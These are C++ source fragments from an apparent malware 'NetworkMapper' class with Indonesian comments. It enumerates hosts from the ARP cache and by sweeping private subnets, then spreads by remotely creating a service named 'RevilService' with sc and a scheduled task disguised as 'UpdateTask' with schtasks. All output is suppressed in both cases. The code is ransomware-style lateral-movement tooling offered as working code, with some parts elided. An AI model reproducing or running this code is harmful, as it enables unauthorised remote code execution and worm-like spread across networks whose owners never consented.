...
std::vector<std::string> NetworkMapper::advanced_network_discovery() {
    std::vector<std::string> targets;
    
#ifdef _WIN32
    // Scan network untuk host aktif
    system("arp -a > arp_cache.txt 2>nul");
    std::ifstream arp("arp_cache.txt");
    std::string line;
    
    while (std::getline(arp, line)) {
        size_t pos = line.find("dynamic");
        if (pos != std::string::npos) {
{
            // Extract IP address
            size_t ip_start = 0;
            while (ip_start < line.length() && isspace(line[ip_start])) ip_start++;
...
// Tambahkan beberapa target umum
    for (int i = 1; i <= 254; i++) {
        targets.push_back("192.168.1." + std::to_string(i));
        targets.push_back("10.0.0." + std::to_string(i));
        targets.push_back("172.16.1." + std::to_string(i));
    }
#endif
...
std::string NetworkMapper::get_local_ip() {
#ifdef _WIN32
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
...
bool NetworkMapper::psexec_like_execute(const std::string& target, const std::string& command) {
#ifdef _WIN32
    std::string cmd = "sc \\\\" + target + " create RevilService binPath= \"" + command + "\" start= auto >nul 2>&1";
    system(cmd.c_str());
    cmd = "sc \\\\" + target + " start RevilService >nul 2>&1";
    system(cmd.c_str());
    return true;
#else
    return false;
...
bool NetworkMapper::wmi_remote_execute(const std::string& target, const std::string& command) {
#ifdef _WIN32
...
bool NetworkMapper::create_remote_scheduled_task(const std::string& target, const std::string& command) {
#ifdef _WIN32
    std::string cmd = "schtasks /create /s " + target + " /tn \"UpdateTask\" /tr \"" + command + "\" /sc once /st 00:00 /f >nul 2>&1";
    system(cmd.c_str());
    cmd = "schtasks /run /s " + target + " /tn \"UpdateTask\" >nul 2>&1";
    system(cmd.c_str());
    return true;
#else
    return false;
